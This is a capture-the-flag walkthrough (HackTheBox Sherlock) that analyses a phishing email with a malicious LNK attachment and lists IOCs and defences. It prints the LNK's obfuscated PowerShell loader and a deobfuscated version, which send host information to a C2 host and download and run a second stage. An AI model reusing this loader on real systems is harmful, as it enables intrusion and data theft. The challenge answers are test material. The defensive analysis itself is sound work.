# HackTheBox Sherlock: AoTR 1 - A Call from the Museum
## Complete Malware Analysis Walkthrough

**Challenge Type:** Phishing Email Analysis & Malware Forensics  
**Difficulty:** Easy-Medium  
**Skills:** Email forensics, LNK analysis, PowerShell deobfuscation, C2 identification

---

## Table of Contents
1. [Introduction](#introduction)
2. [Setup & Prerequisites](#setup--prerequisites)
3. [Question 1: Suspicious Email Sender](#question-1-suspicious-email-sender)
4. [Question 2: Originating Mail Server](#question-2-originating-mail-server)
5. [Question 3: Attachment Name](#question-3-attachment-name)
6. [Question 4: Document Code](#question-4-document-code)
7. [Question 5: C2 URL (POST Request)](#question-5-c2-url-post-request)
8. [Question 6: Registry Key for System Information](#question-6-registry-key-for-system-information)
9. [Question 7: Second Stage C2 Domain](#question-7-second-stage-c2-domain)
10. [Question 8: Credentials](#question-8-credentials)
11. [Summary & IOCs](#summary--iocs)

---

## Introduction

This Sherlock challenge involves analyzing a sophisticated phishing campaign targeting a museum organization during the holiday season. The attack uses:
- **Typosquatting** for sender spoofing
- **Password-protected malicious archives**
- **LNK file-based payload delivery**
- **Multi-stage C2 communication**
- **PowerShell obfuscation techniques**

---

## Setup & Prerequisites

### Tools Required:
```bash
# Email parsing
python3 (with built-in email library)

# Archive extraction
unzip

# File analysis
file
exiftool

# PDF text extraction
pdftotext (poppler-utils)

# General utilities
grep, cat, head, strings
```

### Extract the Challenge Files:
```bash
cd "/home/kali/Labs/Sherlocks/AoTR 1: A Call from the Museum"
unzip -P hacktheblue AoTR-1_A-Call-from-the-Museum.zip
```

**Files Extracted:**
- `Part 1 - A Call from the Museum.pdf` - Challenge briefing
- `URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml` - Phishing email

---

## Question 1: Suspicious Email Sender

**Question:** *"Who is the suspicious sender of the email?"*

### Analysis Steps:

#### Step 1: Examine Email Headers
```bash
head -50 "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

**Output (relevant portion):**
```
Return-Path: <eu-health@ca1e-corp.org>
From: EU Health Logistics Office <eu-health@ca1e-corp.org>
To: "kamil.poltavez@cale-corp.org" <kamil.poltavez@cale-corp.org>
```

#### Step 2: Identify the Attack Technique

**Analysis:**
- **Legitimate domain:** `cale-corp.org` (recipient's domain)
- **Spoofed domain:** `ca1e-corp.org` (sender's domain)
- **Notice:** The letter "l" is replaced with number "1" → **Typosquatting/Homograph Attack**

**Red Flags:**
- Domain looks similar but is different
- Character substitution (l → 1)
- Claims to be from internal department but uses different domain

### Answer:
```
eu-health@ca1e-corp.org
```

**Key Learning:** Always verify sender domains carefully. Attackers use typosquatting to create convincing fake domains that appear legitimate at first glance.

---

## Question 2: Originating Mail Server

**Question:** *"What is the legitimate server that initially sent the email?"*

### Analysis Steps:

#### Step 1: Extract All "Received" Headers
```bash
grep "^Received:" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

**Output:**
```
Received: from BG1P293CU004.outbound.protection.outlook.com
Received: from BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM (2603:10a6:290:4f::14) by
Received: from BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM ([fe80::deb0:79a0:1091:c278]) by
```

#### Step 2: Understand Email Flow

**Important:** Received headers are added in **reverse chronological order**:
- **First header (top)** = Last server before recipient (final hop)
- **Last header (bottom)** = Original sending server

**Email Journey:**
```
Origin → Microsoft Exchange → Microsoft EOP Gateway → Recipient
```

#### Step 3: Identify the Sending Server

From the recipient's perspective, the email was received from:
```
BG1P293CU004.outbound.protection.outlook.com (52.101.176.77)
```

This is **Microsoft's Exchange Online Protection** outbound gateway that delivered the email externally.

### Answer:
```
BG1P293CU004.outbound.protection.outlook.com
```

**Key Learning:** The "legitimate server" is the external-facing mail gateway that delivered the email to the recipient, even though the email itself is malicious. The attacker used a compromised Microsoft 365 account to send the phishing email.

---

## Question 3: Attachment Name

**Question:** *"What is the name of the attachment?"*

### Analysis Steps:

#### Step 1: Search for Attachment Headers
```bash
grep -i "filename\|Content-Disposition" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

**Output:**
```
Content-Type: application/zip; filename="Health_Clearance-December_Archive.zip"; name="Health_Clearance-December_Archive.zip"
Content-Disposition: attachment; filename="Health_Clearance-December_Archive.zip"; name="Health_Clearance-December_Archive.zip"
```

#### Step 2: Analyze the Attachment

**Attachment Details:**
- **Type:** ZIP archive (password-protected)
- **Name:** `Health_Clearance-December_Archive.zip`
- **Social Engineering:** 
  - "Health_Clearance" → Authority/urgency
  - "December" → Time-sensitive
  - "Archive" → Appears legitimate

### Answer:
```
Health_Clearance-December_Archive.zip
```

**Key Learning:** Phishing emails often use professional-sounding attachment names with urgency triggers (dates, compliance terms) to pressure victims into opening them.

---

## Question 4: Document Code

**Question:** *"What is the Document Code?"*

### Analysis Steps:

#### Step 1: Extract the ZIP Attachment from Email
```bash
python3 << 'PYTHON_EOF'
import email

with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
    
    for part in msg.walk():
        if part.get_content_type() == 'application/zip':
            filename = part.get_filename()
            data = part.get_payload(decode=True)
            
            with open('extracted.zip', 'wb') as zf:
                zf.write(data)
            print(f"Extracted: {filename} ({len(data)} bytes)")
PYTHON_EOF
```

**Output:**
```
Extracted: Health_Clearance-December_Archive.zip (113808 bytes)
```

#### Step 2: List ZIP Contents
```bash
unzip -l extracted.zip
```

**Output:**
```
Archive:  extracted.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     3821  2025-11-14 14:02   EU_Health_Compliance_Portal.lnk
   145714  2025-11-14 10:12   Health_Clearance_Guidelines.pdf
---------                     -------
   149535                     2 files
```

#### Step 3: Get Password from Email Body
```bash
python3 << 'PYTHON_EOF'
import email

with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
    
    for part in msg.walk():
        if part.get_content_type() == 'text/html':
            payload = part.get_payload(decode=True)
            if payload:
                text = payload.decode('utf-8', errors='ignore')
                # Search for password
                if 'password' in text.lower():
                    lines = text.split('\n')
                    for line in lines:
                        if 'password' in line.lower():
                            print(line.strip())
PYTHON_EOF
```

**Found Password:** `Up7Pk99G`

#### Step 4: Extract ZIP with Password
```bash
unzip -P Up7Pk99G extracted.zip
```

**Output:**
```
Archive:  extracted.zip
  inflating: EU_Health_Compliance_Portal.lnk  
  inflating: Health_Clearance_Guidelines.pdf
```

#### Step 5: Search PDF for Document Code
```bash
pdftotext Health_Clearance_Guidelines.pdf - | head -5
```

**Output:**
```
Health Portal Compliance Access Guidelines
European Cross-Border Festive Operations — Document Code EU-HMU-24X — December Cycle — Binding Internal Guidance
...
```

### Answer:
```
EU-HMU-24X
```

**Key Learning:** Attackers create realistic-looking documents with official codes and formatting to increase credibility. The document code was embedded in a decoy PDF to make the phishing more convincing.

---

## Question 5: C2 URL (POST Request)

**Question:** *"What is the full URL of the C2 contacted through a POST request?"*

### Analysis Steps:

#### Step 1: Analyze the LNK File
```bash
file EU_Health_Compliance_Portal.lnk
```

**Output:**
```
EU_Health_Compliance_Portal.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=11, [...] LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

**Key Finding:** The LNK file points to PowerShell!

#### Step 2: Extract LNK Metadata
```bash
exiftool EU_Health_Compliance_Portal.lnk
```

**Relevant Output:**
```
Target File DOS Name            : powershell.exe
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Command Line Arguments          : -nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));sap`s .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(i`wr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };i`wr -Headers $Hd $Lj$Zu | i`ex;"
```

#### Step 3: Save PowerShell Command for Analysis
```bash
exiftool EU_Health_Compliance_Portal.lnk | grep "Command Line Arguments" | sed 's/.*-cOmManD "//' | sed 's/"$//' > ps_command.txt
cat ps_command.txt
```

#### Step 4: Decode URL-Encoded Strings
```bash
python3 << 'PYTHON_EOF'
import urllib.parse

# URLs from PowerShell
url1_encoded = 'https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin'
url2_encoded = 'https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'

url1 = urllib.parse.unquote(url1_encoded)
url2 = urllib.parse.unquote(url2_encoded)

print("URL 1 (POST request):", url1)
print("URL 2 (Second stage):", url2)
PYTHON_EOF
```

**Output:**
```
URL 1 (POST request): https://health-status-rs.com/api/v1/checkin
URL 2 (Second stage): https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=
```

#### Step 5: Analyze PowerShell Logic

**Deobfuscated PowerShell Flow:**
```powershell
# 1. Opens PDF as decoy
Start-Process .\Health_Clearance_Guidelines.pdf

# 2. Collect system information
$AX = $env:USERNAME              # Current username
$Bz = $env:USERDOMAIN            # Domain name
$Mw = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid

# 3. POST request to C2 with system info
$pP = @{u=$AX; d=$Bz; g=$Mw}
$Zu = (Invoke-WebRequest $oM -Method POST -Body $pP).Content

# 4. Download and execute second stage (covered in later question)
```

### Answer:
```
https://health-status-rs.com/api/v1/checkin
```

**Key Learning:** LNK files can contain malicious PowerShell commands. The script uses URL encoding and obfuscation to hide C2 infrastructure. Always analyze LNK files with `exiftool` to extract command line arguments.

---

## Question 6: Registry Key for System Information

**Question:** *"The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?"*

### Analysis Steps:

#### Step 1: Identify POST Request Variables
```bash
cat ps_command.txt
```

**Variables in Order of Assignment:**
```powershell
$AX = $env:USERNAME                    # 1st piece: Username
$Bz = $env:USERDOMAIN                  # 2nd piece: Domain
$Mw = (gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid  # 3rd piece: MachineGuid
```

**POST Body:**
```powershell
$pP = @{u=$AX; d=$Bz; g=$Mw}
# Sends: {username, domain, MachineGuid}
```

#### Step 2: Analyze Registry Access

**PowerShell Command Breakdown:**
```powershell
$Mw = (gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
```

Where:
- `gp` = `Get-ItemProperty` (registry read cmdlet)
- `HKLM:` = PowerShell drive for `HKEY_LOCAL_MACHINE`
- `\SOFTWARE\Microsoft\Cryptography` = Registry key path
- `.MachineGuid` = Property/value name being accessed

#### Step 3: Format the Complete Path

The question asks for the registry key **from which** the data is retrieved, meaning the full path including the value name:

```
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
```

**Note:** Windows registry format uses backslashes (`\`), not PowerShell's colon notation (`:`).

### Answer:
```
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
```

**Key Learning:** The `MachineGuid` is a unique identifier for Windows installations, commonly used by malware to:
- Track individual victims
- Avoid re-infection of the same system
- Generate unique implant IDs
- Correlate activities across multiple sessions

---

## Question 7: Second Stage C2 Domain

**Question:** *"Then the script downloads and executes a second stage from another URL. What is the domain?"*

### Analysis Steps:

#### Step 1: Review PowerShell Command for Second Stage
```bash
cat ps_command.txt
```

**Relevant Section:**
```powershell
$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
$Hd = @{Authorization = $Bs};
i`wr -Headers $Hd $Lj$Zu | i`ex;
```

#### Step 2: Understand Two-Stage Attack Flow

**Stage 1: Initial Check-in (POST)**
```
POST https://health-status-rs.com/api/v1/checkin
Body: {username, domain, MachineGuid}
Response: Unique Client ID (stored in $Zu)
```

**Stage 2: Download & Execute Payload (GET)**
```
GET https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=<ID>
Headers: Authorization (credentials)
Action: Pipe response to Invoke-Expression (execute in memory)
```

#### Step 3: Extract Domain from Second URL
```bash
python3 << 'PYTHON_EOF'
import urllib.parse
from urllib.parse import urlparse

url2_encoded = 'https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'
url2 = urllib.parse.unquote(url2_encoded)

parsed = urlparse(url2)
print(f"Full URL: {url2}")
print(f"Domain: {parsed.netloc}")
PYTHON_EOF
```

**Output:**
```
Full URL: https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=
Domain: advent-of-the-relics-forum.htb.blue
```

### Answer:
```
advent-of-the-relics-forum.htb.blue
```

**Key Learning:** Multi-stage malware separates initial reconnaissance from payload delivery. This approach:
- Makes detection harder (payload never downloaded if first stage fails)
- Allows dynamic payload selection based on victim
- Uses response from first C2 to build second C2 URL
- Executes payload in memory with `Invoke-Expression` (fileless)

---

## Question 8: Credentials

**Question:** *"A set of credentials was used to access the previous resource. Retrieve them."*

### Analysis Steps:

#### Step 1: Locate Authorization Header in PowerShell
```bash
cat ps_command.txt
```

**Relevant Code:**
```powershell
$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
$Hd = @{Authorization = $Bs};
i`wr -Headers $Hd $Lj$Zu | i`ex;
```

**Analysis:**
- `$Bs` contains the authorization header value
- String is split into chunks (obfuscation technique)
- `-join` concatenates the parts
- Used in `Authorization` header when requesting second stage

#### Step 2: Reconstruct and Decode the Credentials
```bash
python3 << 'PYTHON_EOF'
import base64

# Reconstruct joined string
parts = ['Basic c3', 'ZjX3Rlb', 'XA6U2', '5', 'vd0JsY', 'WNrT', '3V', '0X', 'zIwM', 'jYh']
full_auth_header = ''.join(parts)

print("Authorization Header:", full_auth_header)

# Extract Base64 part (after "Basic ")
base64_creds = full_auth_header.replace('Basic ', '')
print("Base64 Encoded:", base64_creds)

# Decode Base64
decoded = base64.b64decode(base64_creds).decode('utf-8')
print("Decoded Credentials:", decoded)

# Parse username:password
username, password = decoded.split(':', 1)
print(f"\nUsername: {username}")
print(f"Password: {password}")
PYTHON_EOF
```

**Output:**
```
Authorization Header: Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
Base64 Encoded: c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
Decoded Credentials: svc_temp:SnowBlackOut_2026!

Username: svc_temp
Password: SnowBlackOut_2026!
```

#### Step 3: Understand HTTP Basic Authentication

**Format:** `Authorization: Basic <base64(username:password)>`

**Decoding Process:**
```
"Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
↓ Remove "Basic " prefix
"c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
↓ Base64 decode
"svc_temp:SnowBlackOut_2026!"
↓ Split on ":"
Username: svc_temp
Password: SnowBlackOut_2026!
```

### Answer:
```
svc_temp:SnowBlackOut_2026!
```

**Key Learning:** 
- Attackers obfuscate credentials by splitting Base64 strings into chunks
- HTTP Basic Auth uses simple Base64 encoding (not encryption!)
- Service account names (svc_) suggest potential for lateral movement
- Password theme ("SnowBlackOut_2026!") aligns with campaign timing (December/festive)

---

## Summary & IOCs

### Attack Flow Overview

```
1. Phishing Email
   └─> Typosquatted sender: eu-health@ca1e-corp.org
   └─> Password-protected ZIP attachment

2. Malicious Archive
   └─> Contains: LNK file + Decoy PDF
   └─> Password: Up7Pk99G

3. LNK Execution
   └─> Launches PowerShell with obfuscated command
   └─> Opens PDF as decoy

4. Stage 1: System Reconnaissance
   └─> Collects: Username, Domain, MachineGuid
   └─> POST to: health-status-rs.com/api/v1/checkin

5. Stage 2: Payload Delivery
   └─> GET from: advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=
   └─> Uses credentials: svc_temp:SnowBlackOut_2026!
   └─> Executes in memory (fileless)
```

### Indicators of Compromise (IOCs)

#### Email IOCs
- **Sender:** eu-health@ca1e-corp.org
- **Subject:** URGENT: Updated Health & Customs Compliance for Cross-Border Festive Event
- **Sending Server:** BG1P293CU004.outbound.protection.outlook.com

#### File IOCs
- **ZIP:** Health_Clearance-December_Archive.zip
- **LNK:** EU_Health_Compliance_Portal.lnk
  - SHA256: [compute with `sha256sum`]
- **PDF:** Health_Clearance_Guidelines.pdf
  - Document Code: EU-HMU-24X

#### Network IOCs
- **C2 Domain 1:** health-status-rs.com
  - URL: https://health-status-rs.com/api/v1/checkin
  - Method: POST
- **C2 Domain 2:** advent-of-the-relics-forum.htb.blue
  - URL: https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=
  - Method: GET
  - Auth: Basic (Base64)

#### Credential IOCs
- **Username:** svc_temp
- **Password:** SnowBlackOut_2026!
- **Base64 Auth Token:** c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh

#### Registry IOCs
- **Accessed Key:** HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
- **Purpose:** Unique victim identification

### Attack Techniques (MITRE ATT&CK)

| Technique ID | Technique Name | Description |
|--------------|----------------|-------------|
| T1566.001 | Phishing: Spearphishing Attachment | ZIP with malicious LNK |
| T1204.002 | User Execution: Malicious File | User opens LNK file |
| T1547.009 | LNK Files | Shortcut file executes PowerShell |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Obfuscated PS script |
| T1027 | Obfuscated Files or Information | String splitting, URL encoding |
| T1082 | System Information Discovery | Collects username, domain, GUID |
| T1012 | Query Registry | Reads MachineGuid |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTPS C2 communication |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | HTTPS encryption |
| T1105 | Ingress Tool Transfer | Downloads second stage payload |
| T1620 | Reflective Code Loading | Invoke-Expression (in-memory execution) |

### Detection Opportunities

1. **Email Gateway:**
   - Block typosquatted domains
   - Scan password-protected archives
   - Flag LNK files in ZIP attachments

2. **Endpoint:**
   - Monitor PowerShell execution with suspicious flags (`-nONi`, `-eXeC bYPaSs`)
   - Detect registry access to MachineGuid
   - Alert on `Invoke-Expression` usage
   - Block LNK files launching PowerShell

3. **Network:**
   - Block/alert on suspicious domains
   - Monitor for POST requests with system info
   - Detect Base64 patterns in HTTP headers

4. **SIEM/Log Analysis:**
   - Correlate LNK execution → PowerShell → Network connections
   - Flag commands with URL encoding/Base64
   - Monitor for outbound HTTPS to non-standard domains

### Recommended Mitigations

1. **User Training:**
   - Recognize typosquatting in email addresses
   - Verify sender domains before opening attachments
   - Report suspicious emails to security team

2. **Technical Controls:**
   - Implement DMARC/SPF/DKIM
   - Block execution of LNK files from user-writable locations
   - Use PowerShell Constrained Language Mode
   - Enable Attack Surface Reduction (ASR) rules
   - Deploy EDR solution with behavioral detection

3. **Email Security:**
   - Scan password-protected archives
   - Block LNK files in email attachments
   - Implement URL rewriting/sandboxing

4. **Network Security:**
   - Deploy DNS filtering
   - Use TLS inspection where appropriate
   - Monitor for C2 communication patterns

---

## Tools Reference

### Commands Used in This Analysis

```bash
# Email analysis
head -50 email.eml
grep "^From:" email.eml
grep "^Received:" email.eml
grep -i "filename" email.eml

# Python email parsing
python3 -c "import email; ..."

# Archive extraction
unzip -l archive.zip
unzip -P password archive.zip

# File analysis
file filename.lnk
exiftool filename.lnk

# PDF analysis
pdftotext file.pdf -

# Text processing
grep, cat, head, tail, sed, awk

# Base64 decoding
echo "base64string" | base64 -d
python3 -c "import base64; ..."

# URL decoding
python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"
```

### Python Scripts for Automation

**Extract Email Attachment:**
```python
import email

with open('email.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
    for part in msg.walk():
        if part.get_content_maintype() == 'multipart':
            continue
        filename = part.get_filename()
        if filename:
            data = part.get_payload(decode=True)
            with open(filename, 'wb') as outfile:
                outfile.write(data)
```

**Decode PowerShell Credentials:**
```python
import base64

parts = ['Basic c3', 'ZjX3Rlb', 'XA6U2', '5', 'vd0JsY', 'WNrT', '3V', '0X', 'zIwM', 'jYh']
full = ''.join(parts)
b64 = full.replace('Basic ', '')
decoded = base64.b64decode(b64).decode('utf-8')
username, password = decoded.split(':', 1)
print(f"{username}:{password}")
```

---

## Conclusion

This challenge demonstrates a realistic phishing attack chain with multiple layers of obfuscation and evasion. Key takeaways:

1. **Email forensics** requires careful examination of headers and attachments
2. **LNK files** are dangerous and should be analyzed with caution
3. **PowerShell obfuscation** can hide malicious intent but is reversible
4. **Multi-stage C2** complicates detection and allows dynamic payload delivery
5. **Credential theft** enables further compromise and lateral movement

By understanding each stage of the attack, defenders can implement appropriate detection and prevention controls at multiple layers.

---

**Challenge Completed! 🎉**

